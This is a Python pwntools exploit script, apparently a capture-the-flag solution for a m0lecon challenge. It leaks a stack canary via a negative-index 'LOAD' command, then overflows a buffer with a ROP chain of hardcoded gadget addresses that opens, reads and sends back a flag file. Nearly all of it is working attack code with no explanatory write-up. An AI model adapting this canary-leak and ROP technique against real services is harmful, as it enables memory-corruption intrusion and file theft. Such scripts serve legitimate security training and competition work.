from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "challs.m0lecon.it"
    port = 9010
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(verbose=True):
    s = r.recv()
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(':')
    sendline(str(choice))

# receive and send
def rs(r, s, new_line=True):
    recvuntil(r)
    if new_line:
        sendline(s)
    else:
        send(s)


# read canary
canary_pos = 8 * 8 + 40
canary_pos //= 8
canary_pos *= -1
print(canary_pos)
wait_for_attach()
sendline('LOAD {}'.format(canary_pos))

canary = just_u64(r.recv(8))
print(hex(canary))
# send bof
payload = 'EXIT 0 '
payload += 'A' * (8 * 5 - len(payload))
payload += p64(canary)


flag_file = 0x401518
pop_rdi = 0x004014f3
pop_rsi_r15 = 0x004014f1
open_addr = 0x400c40
read_addr = 0x400be0
send_len_addr = 0x400e7b
mov_rdx_20 = 0x00401528

print(send_len_addr)
buf = 0x602150

rop = [
        p64(0xdeadbeef),
        p64(pop_rdi),
        p64(flag_file),
        p64(pop_rsi_r15),
        p64(0),
        p64(0),
        p64(open_addr),

        p64(pop_rdi),
        p64(3),
        p64(pop_rsi_r15),
        p64(buf),
        p64(buf), #dummy
        p64(mov_rdx_20),
        p64(read_addr),

        p64(pop_rdi),
        p64(4),
        p64(pop_rsi_r15),
        p64(buf),
        p64(buf),
        p64(mov_rdx_20),
        p64(send_len_addr),
        ]

rop = ''.join(rop)
payload += rop
sendline(payload)
print(recv())
